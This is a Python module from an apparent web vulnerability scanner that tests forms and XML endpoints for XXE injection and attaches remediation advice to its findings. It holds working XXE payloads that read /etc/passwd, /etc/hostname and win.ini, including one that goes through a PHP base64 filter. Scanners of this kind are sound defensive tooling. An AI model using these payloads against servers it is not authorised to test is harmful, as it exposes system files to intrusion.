from __future__ import annotations
"""
scanner/testers/xxe.py
------------------------
XML External Entity (XXE) injection tester.

Tests for XXE by injecting XML payloads into parameters and file upload
endpoints that may be parsed by XML processors on the server.

Covers:
  - Classic XXE (file read via ENTITY)
  - XXE via parameter entities
  - XML bomb / billion laughs detection (checks if server is vulnerable
    to denial-of-service but does NOT actually send destructive payloads)
  - XXE via SVG/SOAP/XML content types
"""

import logging

from scanner.testers.base import BaseTester
from scanner.crawler import CrawledPage
from scanner.reporting.models import Finding, Severity
from scanner.utils import http as http_utils

logger = logging.getLogger(__name__)

# XXE payloads that attempt to read a known file
_XXE_PAYLOADS = [
    # Classic XXE — Linux
    (
        '<?xml version="1.0"?><!DOCTYPE w3b [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>',
        "root:",
        "Classic XXE (file:///etc/passwd)",
    ),
    # Classic XXE — Windows
    (
        '<?xml version="1.0"?><!DOCTYPE w3b [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root>&xxe;</root>',
        "[extensions]",
        "Classic XXE (win.ini)",
    ),
    # XXE via parameter entity
    (
        '<?xml version="1.0"?><!DOCTYPE w3b [<!ENTITY % xxe SYSTEM "file:///etc/hostname">'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///etc/hostname\'>">%eval;%exfil;]>'
        '<root>test</root>',
        "",
        "Parameter entity XXE",
    ),
    # XXE via PHP filter
    (
        '<?xml version="1.0"?><!DOCTYPE w3b [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=/etc/passwd">]>'
        '<root>&xxe;</root>',
        "cm9vd",  # base64 of "root:" starts with this
        "XXE via PHP filter",
    ),
]

# Content types that indicate XML processing
_XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "image/svg+xml",
]


class XXETester(BaseTester):
    """Test for XML External Entity injection vulnerabilities."""

    def __init__(self) -> None:
        super().__init__(name="XXE Injection")

    def run(self, pages: list[CrawledPage]) -> list[Finding]:
        if not pages:
            return self.findings

        pages = self._filter_pages_by_scope(pages)

        for page in pages:
            # Test forms that might accept XML
            for form in page.forms:
                self._test_form_xxe(form)

            # Test the URL directly with XML content type
            self._test_endpoint_xxe(page.url)

        return self.findings

    def _test_form_xxe(self, form) -> None:
        """Inject XXE payloads into form fields."""
        for field in form.testable_fields:
            for payload, marker, desc in _XXE_PAYLOADS:
                self._count_test()
                data = self._inject_form(form, field.name, payload)

                try:
                    if form.method == "POST":
                        resp = http_utils.post(form.action_url, data=data)
                    else:
                        continue  # XXE via GET is extremely unlikely
                except Exception:
                    continue

                if marker and marker in resp.text:
                    self._log_finding(Finding(
                        vuln_type="XML External Entity (XXE) Injection",
                        severity=Severity.CRITICAL,
                        url=form.action_url,
                        parameter=field.name,
                        method=form.method,
                        payload=payload[:200],
                        evidence=self._extract_error_snippet(resp.text, marker),
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "Java: setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                            "PHP: libxml_disable_entity_loader(true). "
                            "Python: use defusedxml instead of xml.etree. "
                            ".NET: set XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit. "
                            "See OWASP XXE Prevention Cheat Sheet."
                        ),
                    ))
                    return  # One confirmed XXE per form is enough

    def _test_endpoint_xxe(self, url: str) -> None:
        """Send XML payloads directly to endpoints with XML content type."""
        self._count_test()

        for payload, marker, desc in _XXE_PAYLOADS[:2]:
            try:
                resp = http_utils.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue

            if marker and marker in resp.text:
                self._log_finding(Finding(
                    vuln_type="XML External Entity (XXE) Injection",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter="XML body",
                    method="POST",
                    payload=payload[:200],
                    evidence=self._extract_error_snippet(resp.text, marker),
                    remediation=(
                        "Disable external entity processing in your XML parser. "
                        "Reject unexpected Content-Type headers at the web server level."
                    ),
                ))
                return

            # Check if the server returned an XML parsing error (indicates it tried to parse)
            error_indicators = [
                "xml parsing error", "xmlsyntaxerror", "saxparseexception",
                "xmlexception", "invalid xml", "not well-formed",
                "premature end", "unterminated entity",
            ]
            body_lower = resp.text.lower()
            for indicator in error_indicators:
                if indicator in body_lower:
                    self._log_finding(Finding(
                        vuln_type="XML Parser Exposed",
                        severity=Severity.MEDIUM,
                        url=url,
                        parameter="XML body",
                        method="POST",
                        payload=payload[:200],
                        evidence=self._extract_error_snippet(resp.text, indicator),
                        remediation=(
                            "The server processes XML input and leaks parser error details. "
                            "Disable XML parsing for endpoints that don't need it, and "
                            "suppress detailed error messages in production."
                        ),
                    ))
                    return
